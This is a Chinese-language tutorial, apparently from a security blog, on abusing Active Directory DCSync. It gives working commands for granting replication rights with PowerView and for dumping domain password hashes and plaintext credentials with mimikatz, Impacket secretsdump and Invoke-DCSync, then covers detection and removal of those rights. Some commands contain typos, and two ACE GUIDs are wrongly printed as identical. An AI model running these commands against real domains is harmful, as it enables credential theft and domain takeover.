# 滥用DCSync

在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory
Replication
Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。

在DCSync功能出现以前，要想获得域用户的哈希数据等，需要登陆域控并在其上执行操作才能获得域用户数据。2015年8月，新版的mimikatz增加了DCSync功能，他有效的''模拟“了一个域控，并向目标域控请求账户哈希值等数据。该功能的最大特点是可以实现不登陆域控而获取目标域控上的数据。

 **注意** ：默认情况下，不允许从只读域控上获取数据，因为只读域控是不能复制同步数据给其他域控的。

## DCSync的工作原理

DCSync是如何工作的呢？总的来说分为以下的两步：

1）在网络中发现域控  
2）利用目录复制服务的GetNCChanges接口向域控发起数据同步的请求

下面来看看详细的工作过程：

当一个域控（我们称之为客户端）希望从另一个域控（我们称之为服务端）获得活动目录对象更新时，客户端域控会向服务端域控发起DRSGetNCChanes请求。该请求的响应包含一组客户端必须应用于其复制副本的更新。如果更新集太大，可能只有一条响应消息。在这种情况下，将完成多个DRSGetNCChanes请求和响应。这个过程被称为复制周期或简单的循环。

当服务端域控收到复制同步请求时，然后对执行复制的每个客户端域控来说，他会执行一个复制周期。这类似于客户端中使用的DRSGetNCChanes请求。

## 修改 DCSync ACL

到底是什么用户才具有运行DCSync 的权限呢？能不能通过修改普通用户的ACL使其获得DCSync的权限呢？带着这个疑问，我们往下看。

### 1、具有DCSync权限的用户

运行DCSync需要具有特殊的权限，默认情况下，只有以下组中的用户具有运行DCSync的权限

  * Administrator 组内的用户

  * Domain Admins 组内的用户

  * Enterprise Admins 组内的用户

  * 域控计算机账户

我们可以使用Adfind执行如下的命令查询域内具备具备DCSync权限的用户：

    
    
    AdFind.exe -s subtree -b "DC=hack,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute
    

### 2、修改DCSync的ACL

如何让普通域用户也获得DCSync的权限呢？一般情况下，只需要想普通域用户加入下面两条ACE即可：

  * DS-Replication-Get-Changes：复制目录更改权限，该权限只能从给定的域复制数据，不包括私密域数据。该ACE的rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。

  * DS-Replication-Get-Changes-ALL:复制目录更改所有项权限，该权限允许复制给定的任意域中的所有数据，包括私密域数据。该ACE为rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。

 **注意** ：其实还有 Replicating Directory Changes In Filtered
Set（复制筛选集中的目录更改权限）但还是很少见，仅在某些环境中需要，所以可以忽略。该ACE的rightsGUID为：89e95b76-444d-4e62-991a-0facbeda640c。

(1) 图形化赋予指定用户的DCSync权限

打开“Active Directory 用户和计算机”——>"查看“——>"高级功能”，找到域 hack.com
，右击，选择“属性"选项，然后在弹出的对话框中单击"安全"选项卡的”高级“按钮，可以看到Domain
Controlles具备"复制目录更改所有项的权限",这也就是为什么Domain Controlles具备 DCSync权限了。然后单击”添加"
按钮，"主体”选项选择需要赋予权限的用户，这里的选择用户 hack\jack，"应用于"选择“只是这个对象",如图所示

![图片.png](https://image.3001.net/images/20230506/1683373900_64563f4c42fb0936c7747.png!small)

在”权限“下勾选”复制目录更改“和"复制目录更改所有项"复选框，如图所示，单机”确定“按钮就可以看到用户hack具有的权限了，如图所示：用户jack具有DCSync权限。

![图片.png](https://image.3001.net/images/20230506/1683373922_64563f62864b4f378f433.png!small)

![图片.png](https://image.3001.net/images/20230506/1683373932_64563f6c5c4fac739566a.png!small)

（2）Powershell脚本赋予指定用户DSCync权限

可以使用Empire下的PowerView.ps1脚本执行命令如下，赋予用户test DCSync权限。

    
    
    Import-Module .\pwerview.ps1;
    Add-DomainObjectAcl -TargetIdentity 'DC=hack,DC=com' -PrincipalIde test -Rights DCSync -Verbose
    

## DCSync 攻击

如果拿到了具有DCSync权限的用户，就能利用DCSync功能从指定域控获得域内所有用户的凭据信息了。

用户jack当前以被赋予了DCSync权限，下面介绍利用不同工具进行DCSync攻击。

### 1、Impacket

Impacket下的secretsdump.exe可以通过DCSync功能导出域用户的Hash，使用方法如下：

    
    
    #使用impacket包中的secretsdump.exe程序直接读取
    secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds
    

![图片.png](https://image.3001.net/images/20230506/1683373971_64563f936d7fee162c87c.png!small)

![图片.png](https://image.3001.net/images/20230506/1683373980_64563f9c2fb855e7fa93c.png!small)

### 2、mimikatz

mimikatz也可以通过DCSync功能导出域用户的Hash，使用方法如下：

    
    
    #获取域用户krbtgt的Hash
    lasdump::dcsync /domain:hack.com /user:krbtgt
    #获取所有用户的Hash
    lsadump::dcsync /domain:hack.com /all /csv
    

![图片.png](https://image.3001.net/images/20230506/1683373999_64563fafa3521e6106727.png!small)

### 3、 PowerShell脚本

下载地址：`https://gist.github.com/monoxgas/9d238accd969550136db`

Invoke-DCSync.ps1脚本也可以通过DCSync功能导出域用户的Hash，使用方法如下：

    
    
    Import-Moudle .\Invoke-DCSync.ps1
    #导出域内所有用户的Hash
    Invoke-DCSync -DumForest | ft -wrap -autosize
    #导出域内用户的krbtgt的Hash
    Invoke-DCSync -DumpForest -Users @("krbtgt") | ft -wrap -autosize
    

![图片.png](https://image.3001.net/images/20230506/1683374027_64563fcb5e2fa49ffa93d.png!small)

## 利用DCSync 获取明文凭据

有时候利用DCSync可以获取明文凭据，这是因为账户勾选了"使用可逆加密存储密码的属性",用户再次更改密码会显示其明文密码。

当通过远程访问Internet身份验证服务(IAS)或使用质询握手身份验证协议（CHAP）身份验证时，必须启用“使用可逆加密存储密码”属性。在Internet信息服务中使用摘要式身份验证时，也需要启动此属性。启动此属性后，就能通过DCSync抓取到目标用户的明文凭据了

如图所示，在“jack属性”对话框勾选“使用可逆加密存储密码”选项，然后对用户jack进行密码更改

![图片.png](https://image.3001.net/images/20230506/1683374050_64563fe24987c0a4a26b1.png!small)

此时使用secretsdump.py脚本执行如下的命令获取获取用户jack的明文凭据：

    
    
    python3 secretsdump.py hack/Administrator:123456 -dc-ip 192.168.41.10 -just-dc-user jack
    

## DCSync攻击防御

防守方如何针对DCSync攻击做检测和防御呢？

### 1、DCSync攻击防御

由于DCSync攻击的原理是模拟域控向另外的域控发起数据同步的请求，因此，可以配置网络安全设备过滤流量并设置白名单，只允许指定白名单内的域控IP请求数据同步。

### 2、 DCSync ACL 滥用检测

下载地址：`https://github.com/cyberark/ACLight`

1）可以在网络安全设备上检测来自白名单以外的域控数据同步复制  
2）使用工具检测域内具备DCSync权限的用户。这里可以使用Execute-ACLight2.bat脚本文件进行检测，该工具输出的结果比较直观。执行完该脚本以后，会在当前目录的results生成三个文件。Privilege
Accounts -Layes Analysis.txt是我们要查看生成的结果文件，打开该文件即可看到有哪些用户具有DCSync权限，如图所示

![图片.png](https://image.3001.net/images/20230506/1683374068_64563ff4cedf4cae7c46c.png!small)

除了默认的Administrator域管理员有DCSync权限，用户jack也具有DCSync 权限。

如果发现域内恶意用户被赋予了DCSync权限后，可以使用Empire下的PowerView.ps1脚本执行如下的命令移除DCSync权限：

    
    
    Import-Module .\powerview.ps1
    Remove-DomainObjectACL -TargetIdentity “DC=hack,DC=com" -PrincipalIdentity jack -Rights DCSync
    

![图片.png](https://image.3001.net/images/20230506/1683374083_64564003da7543484da4c.png!small)

